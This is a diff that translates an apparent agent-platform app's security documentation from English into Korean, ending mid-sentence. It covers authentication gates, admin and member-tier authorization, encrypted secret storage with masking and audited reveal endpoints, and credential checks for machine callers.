@@ -1,782 +1,736 @@
-# Security
+# 보안
 
-Who may do what, how credentials are stored and handed out, and where the boundaries are
-that this app enforces — and where they end.
+누가 무엇을 할 수 있는지, 자격 증명이 어떻게 저장되고 건네지는지, 이 앱이 강제하는 경계가
+어디에 있고 — 어디서 끝나는지.
 
-Related: [CONFIGURATION.md](CONFIGURATION.md) for the variables named here,
-[API.md](API.md) for per-endpoint authorization, [ARCHITECTURE.md](ARCHITECTURE.md) for how
-the pieces fit together.
+관련 문서: 여기서 언급하는 변수는 [CONFIGURATION.md](CONFIGURATION.md), 엔드포인트별 인가는
+[API.md](API.md), 조각들이 어떻게 맞물리는지는 [ARCHITECTURE.md](ARCHITECTURE.md).
 
-## Authentication
+## 인증
 
-Better Auth 1.6 with **Google OAuth only**, over a custom DynamoDB adapter on the single
-table (`src/infrastructure/db/authAdapter.ts`). Sign-in is restricted to
-`ALLOWED_EMAIL_DOMAINS`; an empty list allows any domain, which `STAGE=alpha|prod` refuses
-to boot with (see [Boot-time validation](CONFIGURATION.md#boot-time-validation)).
+단일 테이블 위의 커스텀 DynamoDB 어댑터(`src/infrastructure/db/authAdapter.ts`)를 쓰는
+Better Auth 1.6, **Google OAuth 만** 쓴다. 로그인은 `ALLOWED_EMAIL_DOMAINS` 로 제한된다. 빈
+목록은 모든 도메인을 허용하는데, `STAGE=alpha|prod` 는 그 상태로는 부팅을 거부한다
+([부팅 시 검증](CONFIGURATION.md#부팅-시-검증) 참고).
 
-Auth unique fields (email, token) are claimed transactionally with a dedicated lock item
-rather than checked-then-written. `GSI2` remains as a compatibility lookup for rows created
-before the locks existed.
+Auth 의 유니크 필드(email, token)는 확인 후 쓰기가 아니라 전용 잠금 아이템으로 트랜잭션
+안에서 선점한다. `GSI2` 는 그 잠금이 생기기 전에 만들어진 행을 위한 호환용 조회로 남아 있다.
 
-The admin-only member list reads Better Auth user rows. `createdAt` is the join time;
-`lastLoginAt` is updated after successful session creation. Older users have no last-login
-value until they sign in again. A failed timestamp update is logged but does not turn a
-successful identity-provider login into an authentication failure.
+admin 전용 멤버 목록은 Better Auth 의 user 행을 읽는다. `createdAt` 은 가입 시각이고,
+`lastLoginAt` 은 세션 생성에 성공한 뒤 갱신된다. 그 이전부터 있던 사용자는 다시 로그인하기
+전까지 마지막 로그인 값이 없다. 타임스탬프 갱신 실패는 로그에 남지만, 신원 제공자 로그인에
+성공한 것을 인증 실패로 바꾸지는 않는다.
 
-### Two gates, on purpose
+### 두 개의 게이트, 의도적으로
 
-| Surface | Gate | What it decides |
+| 표면 | 게이트 | 무엇을 결정하는가 |
 |---|---|---|
-| Pages | `src/proxy.ts` | Redirect a signed-out visitor to `/login?next=…` |
-| API routes | `withAuth` / `withMemberAuth` / `withAdminAuth` (`src/lib/session.ts`) | 401 without a session; 403 below the required tier (`member`, `admin`); hands `SessionUser` to the handler |
+| 페이지 | `src/proxy.ts` | 로그아웃 상태의 방문자를 `/login?next=…` 로 리다이렉트 |
+| API 라우트 | `withAuth` / `withMemberAuth` / `withAdminAuth` (`src/lib/session.ts`) | 세션이 없으면 401, 요구 tier(`member`, `admin`) 미만이면 403; 핸들러에 `SessionUser` 를 건넨다 |
 
-`src/proxy.ts` is the single owner of which pages are public — `/` and `/login`. Everything
-else the matcher reaches needs a session, so **a new route defaults to protected**. That
-direction is deliberate: forgetting to list a public page produces a redirect a user reports
-in a minute, while forgetting to list a private one fails silently.
+`src/proxy.ts` 는 어떤 페이지가 공개인지에 대한 단일 소유자다 — `/` 와 `/login`. matcher 가
+닿는 나머지 전부는 세션을 요구하므로 **새 라우트는 기본이 보호 상태** 다. 그 방향은
+의도적이다. 공개 페이지를 목록에 넣는 것을 잊으면 사용자가 1분 안에 신고하는 리다이렉트가
+생기지만, 비공개 페이지를 넣는 것을 잊으면 조용히 실패한다.
 
-The page gate checks the *presence* of the session cookie, not its validity. Verifying it
-would mean a session read on every navigation and still would not be the authorization
-decision — that stays server-side in `withAuth` and `assertProjectWritable`, which see the
-request that actually touches data. A present-but-invalid cookie therefore reaches the page
-and gets its 401 from the API behind it; what the gate removes is the ordinary signed-out
-case, which used to hand a visitor the whole console plus an error box.
+페이지 게이트는 세션 쿠키의 유효성이 아니라 *존재* 를 확인한다. 유효성까지 확인하려면 모든
+내비게이션마다 세션을 읽어야 하고, 그러고도 그것은 인가 결정이 아니다 — 인가는 실제로
+데이터를 만지는 요청을 보는 `withAuth` 와 `assertProjectWritable` 에서 서버 측에 남는다.
+따라서 존재하지만 유효하지 않은 쿠키는 페이지에 도달하고 그 뒤의 API 에서 401 을 받는다.
+게이트가 없애는 것은 평범한 로그아웃 상태이며, 예전에는 그 방문자에게 콘솔 전체와 에러 박스를
+함께 건네주곤 했다.
 
-`/api` is outside the matcher: those routes authenticate themselves and must answer a
-programmatic caller with a 401, never an HTML redirect.
+`/api` 는 matcher 밖에 있다. 그 라우트들은 스스로 인증하며, 프로그램 호출자에게는 HTML
+리다이렉트가 아니라 반드시 401 로 답해야 한다.
 
-The `next` parameter arrives from the address bar, so `/login` reads it back through
-`safeNextPath` (`src/shared/safeNextPath.ts`). `//host` and `/\host` have to be rejected or
-the sign-in flow becomes an open redirect.
+`next` 파라미터는 주소창에서 오므로 `/login` 은 그것을
+`safeNextPath`(`src/shared/safeNextPath.ts`)로 되읽는다. `//host` 와 `/\host` 를 거부하지
+않으면 로그인 플로우가 오픈 리다이렉트가 된다.
 
-A refusal travels back out through the same address bar. Better Auth builds the browser's
-`error` parameter from the thrown error's *message*, so that message is a wire format rather
-than prose — a sentence written there lands in the URL, which is how the deployment's
-allowed-domain list used to reach whoever had just been turned away. The codes live in
-`src/shared/signInError.ts` instead (`EMAIL_DOMAIN_NOT_ALLOWED` is the only one this app
-raises), and `/login` maps them to copy it owns. An unrecognised value collapses to one
-generic line **rather than being echoed**: the parameter is server text, and a deployment
-redirected before that mapping existed can still send a whole sentence naming its domains.
-The codes Better Auth raises on its own — a cancelled consent screen, a stale callback —
-differ in ways only a server log can act on, so they collapse too.
+거부는 같은 주소창을 통해 되돌아 나간다. Better Auth 는 브라우저의 `error` 파라미터를 던져진
+에러의 *메시지* 로 만들기 때문에, 그 메시지는 산문이 아니라 와이어 포맷이다 — 거기에 쓴 문장은
+URL 에 실리고, 그것이 배포의 허용 도메인 목록이 방금 거절당한 사람에게 전달되던 경로였다.
+코드는 대신 `src/shared/signInError.ts` 에 있고(`EMAIL_DOMAIN_NOT_ALLOWED` 가 이 앱이 올리는
+유일한 코드다), `/login` 이 그 코드를 자신이 소유한 문구로 매핑한다. 인식하지 못한 값은
+**그대로 되비추는 대신** 하나의 일반 문구로 수렴한다. 그 파라미터는 서버가 쓴 텍스트이고, 그
+매핑이 생기기 전에 리다이렉트된 배포는 지금도 자기 도메인을 밝힌 문장 하나를 통째로 보낼 수
+있다. Better Auth 가 스스로 올리는 코드 — 취소된 동의 화면, 만료된 콜백 — 는 서버 로그만이
+조치할 수 있는 방식으로 다르므로, 그것들도 함께 수렴한다.
 
-## Authorization model
+## 인가 모델
 
-**Projects are a shared catalog.** Any signed-in user may read and run any project. Only
-mutations are gated.
+**Project 는 공유 카탈로그다.** 로그인한 사용자라면 누구나 어떤 project 든 읽고 실행할 수
+있다. 변경(mutation)만 게이트된다.
 
-| Resource | Read | Write |
+| 리소스 | 읽기 | 쓰기 |
 |---|---|---|
-| Project, versions | any signed-in user | owner or configured admin (`assertProjectWritable`) |
-| Project traces | owner or configured admin | — |
-| Project Slack config | owner or configured admin | owner or configured admin |
-| Project API token, triggers, MCP connections | owner or configured admin | owner or configured admin |
-| Per-caller usage (`usage/actors`) | owner or configured admin | — |
-| Project usage totals | any signed-in user | — |
-| Skills / MCP servers / external agents / plugins | `member` tier or above (`withMemberAuth`; a `guest` gets 403) | admin (`withAdminAuth`) |
-| App settings | admin | admin |
-| Member directory | admin | admin (tier changes, audited as `member.set-tier`) |
-| Chats | owner only (non-owner reads 404) | owner only |
+| Project, version | 로그인한 모든 사용자 | 소유자 또는 설정된 admin (`assertProjectWritable`) |
+| Project trace | 소유자 또는 설정된 admin | — |
+| Project Slack 설정 | 소유자 또는 설정된 admin | 소유자 또는 설정된 admin |
+| Project API token, trigger, MCP 연결 | 소유자 또는 설정된 admin | 소유자 또는 설정된 admin |
+| 호출자별 usage (`usage/actors`) | 소유자 또는 설정된 admin | — |
+| Project usage 합계 | 로그인한 모든 사용자 | — |
+| Skill / MCP 서버 / 외부 agent / plugin | `member` tier 이상 (`withMemberAuth`; `guest` 는 403) | admin (`withAdminAuth`) |
+| 앱 설정 | admin | admin |
+| 멤버 디렉터리 | admin | admin (tier 변경, `member.set-tier` 로 감사) |
+| Chat | 소유자만 (소유자가 아니면 404) | 소유자만 |
 
-Traces and the Slack config are gated on *read* as well because they expose other users'
-runtime inputs/outputs and masked credential edges. Project *totals* stay open because the
-catalog is shared; a breakdown by caller names individuals, so `usage/actors` does not. The
-capability registries are withheld from the `guest` tier because they catalogue what the
-deployment can reach rather than anything a guest's own work needs — a guest still *runs*
-projects bound to them, since resolution is server-side. A project's `preview` sits behind the
-same rung: it renders the resolved capability names the registries would otherwise withhold.
+trace 와 Slack 설정은 *읽기* 도 게이트되는데, 다른 사용자의 런타임 입출력과 마스킹된 자격
+증명의 가장자리를 노출하기 때문이다. project *합계* 는 카탈로그가 공유되므로 열어 둔다.
+호출자별 내역은 개인을 지목하므로 `usage/actors` 는 그렇지 않다. capability 레지스트리는
+`guest` tier 에서 제외되는데, 그것이 담는 것은 guest 자신의 작업에 필요한 무엇이 아니라 이
+배포가 무엇에 닿을 수 있는지의 목록이기 때문이다 — guest 도 그것들에 바인딩된 project 를
+*실행* 은 하며, 해석(resolution)은 서버 측에서 일어난다. project 의 `preview` 도 같은 단에
+있다. 레지스트리가 감췄을 해석된 capability 이름을 그대로 렌더링하기 때문이다.
 
 ### `isAdminEmail` vs `isConfiguredAdmin`
 
-Two different admin questions, both in `src/lib/runtime-settings.ts`, and they must not be
-swapped:
+둘 다 `src/lib/runtime-settings.ts` 안에 있는 서로 다른 admin 질문이고, 뒤바꿔 쓰면 안 된다:
 
-| Predicate | Question | Empty `ADMIN_EMAILS` means |
+| 술어 | 질문 | `ADMIN_EMAILS` 가 비었다는 것의 뜻 |
 |---|---|---|
-| `isAdminEmail` | May mutate shared registries and app settings? | **no restriction** — any signed-in user |
-| `isConfiguredAdmin` | May write a project owned by someone else? | **nobody** |
+| `isAdminEmail` | 공유 레지스트리와 앱 설정을 변경해도 되는가? | **제한 없음** — 로그인한 모든 사용자 |
+| `isConfiguredAdmin` | 남이 소유한 project 를 써도 되는가? | **아무도 안 된다** |
 
-Using the first for project ownership would hand every signed-in user write access to every
-project on a deployment that never set `ADMIN_EMAILS`. Both flags are sent to the browser by
-`GET /api/me` — as `isAdmin` and `isConfiguredAdmin` — because the console gate for "may I
-edit this project" must mirror `assertProjectWritable` exactly: reading `isAdmin` there once
-offered every user an edit form for every project, and every save 403'd.
+첫 번째를 project 소유권에 쓰면 `ADMIN_EMAILS` 를 한 번도 설정하지 않은 배포에서 로그인한 모든
+사용자에게 모든 project 의 쓰기 권한을 넘기게 된다. 두 플래그는 `GET /api/me` 가 브라우저로
+함께 보낸다 — `isAdmin` 과 `isConfiguredAdmin` 으로 — "이 project 를 편집해도 되는가"에 대한
+콘솔의 게이트가 `assertProjectWritable` 을 정확히 반영해야 하기 때문이다. 거기서 `isAdmin` 을
+읽었더니 모든 사용자에게 모든 project 의 편집 폼이 열렸고, 저장은 전부 403 이 났다.
 
-**Member tiers add a second source, never a second predicate.** A member whose stored `tier`
-is `admin` gets what *both* predicates grant; the composition is `src/lib/memberAccess.ts`'s
-alone (`isEffectiveAdmin` / `isEffectiveConfiguredAdmin`), and the two list predicates above
-keep their empty-list semantics byte-for-byte. A configured `ADMIN_EMAILS` address is
-promoted to the stored `admin` tier at login or the next member/profile read, and its tier is
-locked while the address remains configured. Removing it from the list never demotes it;
-another operator must choose a lower tier explicitly. The tier lives on the Better Auth user
-row (`input: false`, so no auth API lets a user set their own), is written only through the
-internal adapter or `memberRepository.setTier`'s single-attribute conditional update, and
-reaches route handlers on the session — fresh every request. The seams that never see a
-session (the project-write override, the run bracket's guards) resolve email → tier through a
-30-second per-instance cache, invalidated on the instance that served a tier change. What each
-tier may hold in flight, spend per UTC month, and do (create projects, use API tokens) is
-`TIER_LIMITS` in `src/domain/member/tiers.ts` — gates go through its `tierMay*` predicates,
-never tier-name comparisons. Project creation follows that tier capability without a separate
-effective-admin bypass.
+**멤버 tier 는 두 번째 소스를 더할 뿐, 두 번째 술어를 만들지 않는다.** 저장된 `tier` 가
+`admin` 인 멤버는 *두* 술어가 부여하는 것을 모두 얻는다. 그 합성은 오직
+`src/lib/memberAccess.ts` 의 것이고(`isEffectiveAdmin` / `isEffectiveConfiguredAdmin`), 위 두
+목록 술어는 빈 목록에 대한 의미를 바이트 단위로 그대로 유지한다. `ADMIN_EMAILS` 에 설정된
+주소는 로그인 시 또는 다음 멤버/프로필 읽기 때 저장된 `admin` tier 로 승격되고, 그 주소가
+설정에 남아 있는 동안 tier 는 잠긴다. 목록에서 빼도 결코 강등되지 않는다. 다른 운영자가
+명시적으로 더 낮은 tier 를 골라야 한다. tier 는 Better Auth 의 user 행에 있고(`input: false`
+라 어떤 auth API 로도 사용자가 자기 것을 설정할 수 없다), 내부 어댑터 또는
+`memberRepository.setTier` 의 단일 속성 조건부 업데이트로만 쓰이며, 세션에 실려 라우트
+핸들러에 도달한다 — 요청마다 새로 읽는다. 세션을 볼 일이 없는 이음매들(project 쓰기
+오버라이드, 런 브래킷의 가드)은 email → tier 를 30초짜리 인스턴스별 캐시로 해석하고, 그 캐시는
+tier 변경을 처리한 인스턴스에서 무효화된다. 각 tier 가 동시에 몇 개를 진행할 수 있는지, UTC
+월 기준으로 얼마를 쓸 수 있는지, 무엇을 할 수 있는지(project 생성, API token 사용)는
+`src/domain/member/tiers.ts` 의 `TIER_LIMITS` 다 — 게이트는 tier 이름 비교가 아니라 그 파일의
+`tierMay*` 술어를 거친다. project 생성도 별도의 effective-admin 우회 없이 그 tier capability 를
+따른다.
 
-The monthly cap sums the member's own daily rows from the first of the UTC month, the same
-window and the same rows the profile page reads — one aggregate, so a page cannot report a
-total the guard would disagree with. The person-shaped limits bind `user` actors only. Machine callers (Slack, A2A, webhook,
-schedule) have no member; a **project token** carries its owner's email but deliberately
-spends against its *project's* limits, not the owner's personal budget — a token is a
-service credential. What keeps that from being a bypass is the token gate: a tier without
-API-token rights can neither issue a token (owner-scoped, admin included) nor authenticate
-with an existing one — `authenticateExecution` re-checks the owner's current tier on every
-bearer request and answers 403, so a demotion stops the owner's tokens immediately. Both
-checks fail open when the tier cannot be read: a storage blip must not take every token
-down, the same posture as every other guard's own read.
+월 상한은 멤버 자신의 일별 행을 UTC 월 1일부터 합산한다. 프로필 페이지가 읽는 것과 같은 창,
+같은 행이다 — 집계가 하나뿐이므로 페이지가 가드와 어긋나는 합계를 보고할 수 없다. 사람 모양의
+한도는 `user` actor 에만 적용된다. 기계 호출자(Slack, A2A, webhook, schedule)에는 멤버가 없다.
+**project token** 은 소유자의 email 을 싣지만 의도적으로 소유자의 개인 예산이 아니라 *자기
+project* 의 한도에서 지출한다 — token 은 서비스 자격 증명이다. 그것이 우회가 되지 않게 하는
+것은 token 게이트다. API token 권한이 없는 tier 는 token 을 발급할 수도 없고(소유자 범위,
+admin 포함) 이미 있는 token 으로 인증할 수도 없다 — `authenticateExecution` 은 모든 bearer
+요청에서 소유자의 현재 tier 를 다시 확인하고 403 으로 답하므로, 강등은 그 소유자의 token 을
+즉시 멈춘다. 두 확인 모두 tier 를 읽지 못할 때는 fail-open 한다. 저장소의 일시적 장애가 모든
+token 을 내려서는 안 되며, 다른 모든 가드가 자기 읽기에 취하는 자세와 같다.
 
-The admin override is checked *inside* `assertProjectWritable` rather than threaded in by its
-twenty-odd callers: the rule is "owner or admin", and a flag one caller forgot to pass would
-silently narrow it back to owner-only on that path alone. The function is named for that rule
-and not for the owner — anything that genuinely needs **ownership** (attribution, whose
-credentials to dispatch with, whom to notify) reads `project.ownerEmail`.
+admin 오버라이드는 스무 곳 남짓한 호출자가 인자로 꿰어 넘기는 대신 `assertProjectWritable`
+*안에서* 확인된다. 규칙은 "소유자 또는 admin"이고, 한 호출자가 넘기는 것을 잊은 플래그는 그
+경로에서만 조용히 소유자 전용으로 규칙을 좁힐 것이다. 함수 이름은 소유자가 아니라 그 규칙을
+따라 붙었다 — 진짜로 **소유권** 이 필요한 것(attribution, 누구의 자격 증명으로 디스패치할지,
+누구에게 알릴지)은 `project.ownerEmail` 을 읽는다.
 
-Two consequences of the override are handled rather than assumed away:
+오버라이드의 두 가지 귀결은 없는 셈 치지 않고 처리한다:
 
-- It is **recorded** — an `project.admin-override` audit row and the
-  `[authz] admin … is acting on project …` line — because the write can destroy the row that
-  would have identified who made it, and a project's API token authenticates *as its owner*,
-  so an admin reveal leaves that pair plus a `secret.reveal` row.
-- The settings read it needs **fails closed**: a settings-store outage denies the override
-  rather than turning a non-owner's deterministic 403 into a 500.
+- **기록된다** — `project.admin-override` 감사 행과
+  `[authz] admin … is acting on project …` 라인. 그 쓰기가 누가 했는지를 알려 줬을 행 자체를
+  파괴할 수 있고, project 의 API token 은 *그 소유자로서* 인증하므로 admin 의 reveal 은 그 둘에
+  더해 `secret.reveal` 행을 남긴다.
+- 그것이 필요로 하는 설정 읽기는 **fail-closed** 다. 설정 저장소 장애는 소유자가 아닌 사람의
+  결정적인 403 을 500 으로 바꾸는 대신 오버라이드를 거부한다.
 
-## Secrets at rest
+## 저장된 시크릿
 
-Every stored credential — MCP server headers, external-agent headers, per-version header
-overrides, Slack bot token and signing secret, Telegram bot token and webhook secret, the
-app-wide A2A key, project API tokens, webhook trigger secrets, and the secret app settings (the LLM API key and the plugins-repo
-GitHub token) — is AES-256-GCM encrypted with `AES_ENCRYPTION_KEY` and stored
-under an `enc:v1:` prefix (`src/infrastructure/crypto/secretEncryption.ts`).
+저장되는 모든 자격 증명 — MCP 서버 헤더, 외부 agent 헤더, 버전별 헤더 오버라이드, Slack 봇
+token 과 서명 시크릿, Telegram 봇 token 과 webhook 시크릿, 앱 전역 A2A 키, project API token,
+webhook trigger 시크릿, 그리고 시크릿인 앱 설정(LLM API 키와 plugins 저장소의 GitHub token) —
+은 `AES_ENCRYPTION_KEY` 로 AES-256-GCM 암호화되어 `enc:v1:` 접두사 아래 저장된다
+(`src/infrastructure/crypto/secretEncryption.ts`).
 
-### Masking on read
+### 읽을 때의 마스킹
 
-Reads return a **length-preserving mask**, so the console can show *which* credential is set
-without showing it:
+읽기는 **길이를 보존하는 마스크** 를 반환한다. 콘솔이 값을 보여 주지 않으면서 *어떤* 자격
+증명이 설정돼 있는지는 보여 줄 수 있게 하기 위해서다:
 
-| Plaintext length | Revealed |
+| 평문 길이 | 드러나는 부분 |
 |---|---|
-| < 9 chars | nothing (`*` × length) |
-| 9–20 chars | first 2 and last 2 |
-| ≥ 21 chars | first 4 and last 4 |
+| 9자 미만 | 없음 (`*` × 길이) |
+| 9–20자 | 앞 2자와 뒤 2자 |
+| 21자 이상 | 앞 4자와 뒤 4자 |
 
-The two revealed edges are never allowed to meet. Revealing edges needs the plaintext, so
-masking decrypts — only inside the admin/owner-gated read views that call it, and a
-decryption failure hides the value entirely rather than erroring. A value short enough that
-nothing would be revealed is never decrypted at all, decided from the ciphertext length
-(AES-GCM preserves plaintext length).
+드러난 두 가장자리가 만나는 일은 결코 허용되지 않는다. 가장자리를 드러내려면 평문이
+필요하므로 마스킹은 복호화를 한다 — 그것을 호출하는 admin/소유자 게이트가 걸린 읽기 뷰
+안에서만이고, 복호화 실패는 에러를 내는 대신 값을 통째로 감춘다. 아무것도 드러나지 않을 만큼
+짧은 값은 아예 복호화되지 않으며, 그 판단은 암호문 길이로 내린다(AES-GCM 은 평문 길이를
+보존한다).
 
-### Masks on write
+### 쓸 때의 마스크
 
-A masked or empty value on update **preserves the stored secret**; a masked value under a key
-with no stored counterpart is **dropped**. A mask can only confirm an existing secret, never
-create one. `null` in a header-override map passes straight through as an explicit removal —
-a removal is not a secret.
+업데이트 시 마스킹된 값이나 빈 값은 **저장된 시크릿을 보존한다**. 저장된 상대가 없는 키에 온
+마스킹된 값은 **버린다**. 마스크는 이미 있는 시크릿을 확인해 줄 수만 있고, 만들어 낼 수는
+없다. 헤더 오버라이드 맵의 `null` 은 명시적 제거로 그대로 통과한다 — 제거는 시크릿이 아니다.
 
-### Reveal endpoints
+### reveal 엔드포인트
 
-Four secrets this app issues can be read back in plaintext:
+이 앱이 발급하는 시크릿 중 넷은 평문으로 되읽을 수 있다:
 
-| Secret | Endpoint | Who |
+| 시크릿 | 엔드포인트 | 누가 |
 |---|---|---|
-| App-wide A2A key | `POST /api/settings/a2a-key/reveal` | admin |
-| Named A2A client key | `POST /api/settings/a2a-keys/{name}/reveal` | admin |
-| Project API token | `POST /api/projects/{name}/token/reveal` | owner or admin |
-| Webhook trigger secret | `POST /api/projects/{name}/triggers/{trigger}/reveal` | owner or admin |
+| 앱 전역 A2A 키 | `POST /api/settings/a2a-key/reveal` | admin |
+| 이름 있는 A2A 클라이언트 키 | `POST /api/settings/a2a-keys/{name}/reveal` | admin |
+| Project API token | `POST /api/projects/{name}/token/reveal` | 소유자 또는 admin |
+| Webhook trigger 시크릿 | `POST /api/projects/{name}/triggers/{trigger}/reveal` | 소유자 또는 admin |
 
-All four are **POST although they read**: the response body is a live credential, so it
-stays out of caches, browser history and prefetches. Every reveal leaves an **audit row** with
-the caller's email, and the server-side log line beside it — the row is what a later question
-queries, the line is what survives the audit store itself being unavailable.
+넷 모두 **읽는데도 POST** 다. 응답 본문이 살아 있는 자격 증명이므로 캐시, 브라우저 기록,
+프리페치 바깥에 머물러야 한다. 모든 reveal 은 호출자의 email 과 함께 **감사 행** 을 남기고, 그
+옆에 서버 측 로그 라인도 남긴다 — 행은 나중의 질문이 조회하는 것이고, 라인은 감사 저장소 자체가
+불가용할 때 살아남는 것이다.
 
-These four are therefore stored **encrypted rather than hashed**, which is a deliberate
-trade: the datastore alone is not enough to use one, but the datastore *plus*
-`AES_ENCRYPTION_KEY` is. **Treat that key as the thing standing between a table dump and
-live project credentials.** Project tokens issued before revealing existed are stored as a
-SHA-256 hash instead — they still verify, but cannot be shown again, so the console offers
-regeneration.
+따라서 이 넷은 해시가 아니라 **암호화해서** 저장되며, 이는 의도된 트레이드오프다. 데이터스토어만으로는
+하나도 쓸 수 없지만, 데이터스토어 *더하기* `AES_ENCRYPTION_KEY` 면 쓸 수 있다. **그 키를 테이블
+덤프와 살아 있는 project 자격 증명 사이에 서 있는 것으로 다뤄라.** reveal 이 생기기 전에 발급된
+project token 은 대신 SHA-256 해시로 저장돼 있다 — 검증은 되지만 다시 보여 줄 수는 없으므로
+콘솔이 재발급을 제안한다.
 
-### Generated secret prefixes
+### 발급한 시크릿의 접두사
 
-Secrets AgentDure issues carry a prefix naming product and kind
-(`src/shared/generatedSecret.ts`), the way `ghp_`/`gho_` do for GitHub, so a leaked string is
-traceable to what it opens:
+AgentDure 가 발급하는 시크릿은 GitHub 의 `ghp_`/`gho_` 처럼 제품과 종류를 밝히는 접두사를
+지녀(`src/shared/generatedSecret.ts`), 유출된 문자열이 무엇을 여는지 추적할 수 있다:
 
-| Prefix | Secret |
+| 접두사 | 시크릿 |
 |---|---|
-| `ada_` | app-wide A2A key (admin-managed) |
-| `adc_` | named A2A client key (admin-managed) |
-| `adt_` | project API token (owner-managed) |
-| `adw_` | webhook trigger secret (owner-managed) |
-| `adg_` | Telegram webhook secret (minted per project; handed to Telegram alone, never revealed) |
+| `ada_` | 앱 전역 A2A 키 (admin 관리) |
+| `adc_` | 이름 있는 A2A 클라이언트 키 (admin 관리) |
+| `adt_` | Project API token (소유자 관리) |
+| `adw_` | Webhook trigger 시크릿 (소유자 관리) |
+| `adg_` | Telegram webhook 시크릿 (project 마다 발행. Telegram 에게만 건네고 결코 reveal 하지 않는다) |
 
-The random part is 32 bytes (256 bits), so the prefix costs no entropy that matters.
-Verification never looks at the prefix, so tokens issued under an older spelling — `as*_`,
-and `sk_proj_` before it — keep working.
+랜덤 부분은 32바이트(256비트)이므로 접두사가 잡아먹는 엔트로피는 문제가 되지 않는다. 검증은
+접두사를 결코 보지 않으므로 예전 표기로 발급된 token — `as*_`, 그 이전의 `sk_proj_` — 도 계속
+동작한다.
 
-A project token's display mask is computed at generation and stored beside the ciphertext, so
-listing a token costs no decryption; the mask carries only the prefix and the edge characters,
-never enough to reconstruct the token.
+project token 의 표시용 마스크는 생성 시점에 계산돼 암호문 옆에 저장되므로, token 을 나열하는
+데는 복호화 비용이 들지 않는다. 그 마스크는 접두사와 가장자리 문자만 실어 나르며, token 을
+복원하기에 충분한 적은 결코 없다.
 
-## Request authentication for machine callers
+## 머신 호출자의 요청 인증
 
-Six credentials authenticate a caller with no session cookie:
+세션 쿠키가 없는 호출자를 인증하는 자격 증명이 여섯 가지 있다:
 
-| Surface | Credential | Verification |
+| 표면 | 자격 증명 | 검증 |
 |---|---|---|
-| Execution endpoints (`predict`, `chat/completions`, `agent`) | `Authorization: Bearer adt_…` | Decrypt-and-compare in constant time (or hash compare for a legacy token), scoped to the `{name}` in the path; runs **as the project owner** (`authenticateExecution`) |
-| Slack events | Slack signing secret | HMAC + `timingSafeEqualString`, 5-minute replay window, per-project secret |
-| Telegram webhook | `X-Telegram-Bot-Api-Secret-Token` | `timingSafeEqualString` against the per-project secret this platform registered the webhook with (`adg_…`); Telegram echoes it on every delivery, and there is no signature to check beyond it |
-| Inbound A2A | `X-A2A-Key` | Constant-time compare against the shared `A2A_API_KEY` (actor `a2a:shared-key`), else a hash lookup against the admin-issued **named client keys** (actor `a2a:{client}` — attributed and rate-limited per client). With neither configured the endpoints are off |
-| Webhook triggers | `X-Trigger-Secret` | `cipher.decryptEquals` (constant time) |
-| CronJob ticks — schedule scan (`/api/triggers/scan`), catalog reindex (`/api/catalog/reindex`), plugins sync (`/api/plugins/sync/scan`) | `X-Scan-Token` | `timingSafeEqualString` against `SCHEDULE_SCAN_TOKEN`; unset answers 503, and a refused token logs a warning on all three |
+| 실행 엔드포인트 (`predict`, `chat/completions`, `agent`) | `Authorization: Bearer adt_…` | 복호화 후 상수 시간 비교(레거시 token 은 해시 비교), 경로의 `{name}` 으로 범위 제한. **project 소유자로서** 실행된다 (`authenticateExecution`) |
+| Slack 이벤트 | Slack 서명 시크릿 | HMAC + `timingSafeEqualString`, 5분 리플레이 윈도, project 별 시크릿 |
+| Telegram webhook | `X-Telegram-Bot-Api-Secret-Token` | 이 플랫폼이 webhook 을 등록할 때 쓴 project 별 시크릿(`adg_…`)과 `timingSafeEqualString` 비교. Telegram 이 배달마다 그대로 되돌려주며, 그 밖에 확인할 서명은 없다 |
+| 인바운드 A2A | `X-A2A-Key` | 공유 `A2A_API_KEY` 와 상수 시간 비교(actor `a2a:shared-key`), 아니면 admin 이 발급한 **이름 있는 클라이언트 키** 에 대한 해시 조회(actor `a2a:{client}` — 클라이언트별로 attribution 되고 rate limit 된다). 둘 다 설정돼 있지 않으면 엔드포인트는 꺼져 있다 |
+| Webhook trigger | `X-Trigger-Secret` | `cipher.decryptEquals` (상수 시간) |
+| CronJob 틱 — schedule 스캔(`/api/triggers/scan`), 카탈로그 재색인(`/api/catalog/reindex`), plugins sync(`/api/plugins/sync/scan`) | `X-Scan-Token` | `SCHEDULE_SCAN_TOKEN` 과 `timingSafeEqualString` 비교. 설정돼 있지 않으면 503 으로 답하고, 거부된 token 은 셋 모두에서 경고를 로그에 남긴다 |
 
-**One token opens all three ticks**, which makes it the widest of the six. The same string
-that lets a CronJob ask which schedules are due also runs a plugins sync, and that sync
-writes both registries — skills and MCP servers — adopting names the repository declares and
-rewriting provenance with them. Scope and rotate it as a write credential, not as a probe.
+**하나의 token 이 세 틱을 모두 연다.** 그래서 여섯 중 가장 넓다. CronJob 이 어떤 schedule 이
+도래했는지 물을 수 있게 해 주는 그 문자열이 plugins sync 도 실행하고, 그 sync 는 두 레지스트리
+— skill 과 MCP 서버 — 를 모두 쓴다. 저장소가 선언한 이름을 채택하고 provenance 를 그것으로 다시
+쓴다. 그것은 프로브가 아니라 쓰기 자격 증명으로 범위를 잡고 회전시켜라.
 
-One sibling carries no credential at all: a published project's A2A **Agent Card**
-(`/.well-known/agent-card.json`) is served to anyone once the surface is enabled — a shared
-`A2A_API_KEY` or at least one named client key — because that is what makes the agent
-discoverable, and the A2A handshake starts with the card. It exposes the project's name,
-description and skills; invoking the agent still takes a key.
+형제 중 하나는 자격 증명을 아예 지니지 않는다. published 된 project 의 A2A **Agent Card**
+(`/.well-known/agent-card.json`)는 표면이 켜져 있기만 하면 — 공유 `A2A_API_KEY` 또는 최소 하나의
+이름 있는 클라이언트 키 — 누구에게나 제공된다. 그것이 agent 를 발견 가능하게 만드는 것이고, A2A
+핸드셰이크는 카드에서 시작하기 때문이다. 카드는 project 의 이름, 설명, skill 을 노출한다.
+agent 를 호출하는 데는 여전히 키가 필요하다.
 
-The trigger secret is compared **before** the enabled flag is read, so a disabled trigger
-cannot answer a wrong secret differently from an enabled one — that difference is an oracle
-for which triggers exist.
+trigger 시크릿은 활성화 플래그를 읽기 **전에** 비교된다. 비활성 trigger 가 틀린 시크릿에 활성
+trigger 와 다르게 답할 수 없게 하기 위해서다 — 그 차이는 어떤 trigger 가 존재하는지에 대한
+오라클이다.
 
-Constant-time comparison has one owner, `src/shared/timingSafe.ts`, pinned by
-`tests/architecture.test.ts`.
+상수 시간 비교는 소유자가 하나, `src/shared/timingSafe.ts` 이고
